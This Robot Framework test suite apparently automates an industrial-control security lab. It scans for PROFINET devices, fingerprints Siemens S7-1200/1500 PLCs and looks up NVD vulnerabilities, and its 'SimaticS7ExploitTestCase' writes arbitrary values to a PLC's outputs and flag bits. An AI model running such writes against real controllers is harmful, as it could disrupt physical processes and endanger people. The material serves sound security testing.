***Settings***
Library         Process
Library         Collections
Library         String
Library         ./NVDsearch.py
Library         ./profinetscanner.py
Library         ./S7CommPlusScanner.py
Library         ./S7-1200manipulator.py

***Variables***
${TARGET}               Profinet
${EthIface}             enx0050b66b034c
#enp0s3#
${targetIP}             192.168.250.129         
${newOutputValues}      1111
${newMerkerValues}      101101
${merkerOffset}         2

***Test Cases***
# Note:
# Some of the used scripts need administrative priviledges to run.
# Results are logged with WARN tag to see resulting prints in console and on top of log file.

SiemensScanTestCase
    [Documentation]                 First performs PROFINET scan on given network interface.
    ...                             Found IP addresses of S7 devices are scanned for further information.
    ${IPAddressList}=               Scan for PROFINET devices   ${EthIface} 
    Scan for S7CommPlus devices     ${IPAddressList}
    #Search and display vulnerabilities
SimaticS7ExploitTestCase
    [Documentation]                 Reads the parameters of the S7 device in the given IP address.
    ...                             Afterwards both outputs and merkers are written to with given parameters.
    Read S7 PLC parameters     ${targetIP}
    Write to S7 PLC outputs    ${targetIP}     ${newOutputValues}
    Write to S7 PLC merkers    ${targetIP}     ${newMerkerValues}      ${merkerOffset}

***Keywords***
Search and display vulnerabilities
    [Documentation]     Runs online search for vulnerabilities with given parameter.
    ...                 Opens website with two tabs, one for the search and one for statistics on that search.
    Search from NVD database    ${TARGET}


Scan for PROFINET devices
    [Documentation]     Sends out PROFINET-DCP identify request to which all devices in that subnet
    ...                 supporting the protocol should respond to.
    ...                 Note: Requires administrative priviledges to run.
    ...                 Returns the IP addresses of found devices for further operations.
    [Timeout]           3 seconds
    [Arguments]         ${EthIface}
    ${resultDict}=              Run PROFINET scanner    ${EthIface}
    Log PROFINET scan results   ${resultDict}           ${TRUE}
    ${IPAddressList}=           Save IPs to list        ${resultDict}
    [Return]                    ${IPAddressList}    

Scan for S7CommPlus devices
    [Documentation]     Sends S7CommPlus-protocol 'connection request'-packet to the IP addresses in given array.Siemens devices
    ...                 such as S7-1200 and S7-1500 respond with additional information.
    [Arguments]         ${IPAddressList}
    :FOR    ${IP}    IN      @{IPAddressList}
            ${result} =                         Run S7CommPlus scanner         ${IP}         ${TRUE}
            Log S7CommPlus scanner results      ${result}                      ${TRUE}
    END

Run Profinet scanner externally
    [Documentation]     Runs PROFINET scanner as an external program similarly as from commandprompt.
    ...                 Logs the output at WARN level to output stdout to both log and console.
    Start Process       python  ./profinetscanner.py       -i ${ETH_INTERFACE}
    ${result}           Wait For Process                    timeout=${WAITTIME}      on_timeout=terminate
    Should be equal as integers     ${result.rc}            0
    log                             ${result.stdout}        WARN    

Save IPs to list
    [Documentation]     Saves IP addresses of found S7-1200 or S7-1500 devices
    ...                 from given multi-level dict to an array and returns it.
    [Arguments]         ${IP_dict}
    @{IPAddressList}=   Create List
    FOR     ${Key}    IN      @{IP_dict}
            ${Inner_dict}=      Get From Dictionary     ${IP_dict}           ${Key}
            ${DeviceName}=      Get From Dictionary     ${Inner_dict}       type_of_station
            Run keyword if      '${DeviceName}' == 'S7-1200' or '${DeviceName}' == 'S7-1500'   Append to list from dict  ${Inner_dict}  ip_address     ${IPAddressList}
    END 
    [Return]            ${IPAddressList}   

Append to list from dict
    [Documentation]     Adds value in given dictionary with given key to given array.
    ...                 Bypasses problem of "Run keywords"-keyword not allowing assignment of variables within.
    [Arguments]         ${Dictionary}           ${Key}              ${List}
    ${Value}=           Get From Dictionary     ${Dictionary}       ${Key}
    Append To List      ${List}                 ${Value}

Read S7 PLC parameters
    [Documentation]     Attempts to read Siemens Simatic S7-1200 outputs, inputs and merkers
    ...                 through S7Comm protocol.
    ...                 Can be optionally used to read just one area at a time: (ALL/INPUTS/OUTPUTS/MERKERS)
    [Arguments]         ${IP}   ${SCOPE}=ALL
    Read S7-1200 parameters     ${IP}       ${SCOPE}

Write to S7 PLC outputs
    [Documentation]     Attempts to write to Siemens Simatic S7-1200 outputs.
    ...                 Accepts string of 1 or 0 values to be written.
    ...                 Afterwards values are read to see operations success.
    [Arguments]         ${IP}    ${newOutputValues}
    Write to S7-1200 outputs    ${IP}       ${newOutputValues}
    ${INFO}=                    Format string       Wrote {output} to {ip} outputs      output=${newOutputValues}        ip=${IP}
    log                         ${INFO}             WARN
    Read S7 PLC parameters     ${IP}   OUTPUTS

Write to S7 PLC merkers
    [Documentation]     Attempts to write to Siemens Simatic S7-1200 first 32 merkers (flag bits).
    ...                 Accepts string of 1 or 0 values to be written, with optional offset 0 - 3 (4 bytes).
    ...                 Afterwards values are read to see operations success.
    [Arguments]         ${IP}    ${newMerkerValues}     ${offset}=0
    Write to S7-1200 merkers    ${IP}       ${newMerkerValues}      ${offset}
    ${INFO}=                    Format string       Wrote {output} to {ip} merkers with offset {offset}     output=${newMerkerValues}   ip=${IP}    offset=${offset}
    log                         ${INFO}             WARN
    Read S7 PLC parameters     ${IP}   MERKERS